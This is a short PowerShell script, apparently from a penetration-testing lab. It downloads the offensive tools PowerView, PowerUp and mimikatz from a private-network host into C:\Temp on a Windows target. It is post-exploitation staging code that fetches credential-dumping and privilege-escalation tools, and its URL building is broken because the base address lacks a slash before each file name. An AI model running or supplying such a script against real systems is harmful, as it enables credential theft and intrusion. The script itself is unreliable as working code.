$baseUrl="http://192.168.119.174"
$fileNames = "powerview.ps1", "powerup.ps1", "mimikatz.exe"
$destinationFolder = "C:\Temp"

foreach ($fileName in $fileNames) {
    $url = $baseUrl + $fileName
    $destination = Join-Path -Path $destinationFolder -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destination
}
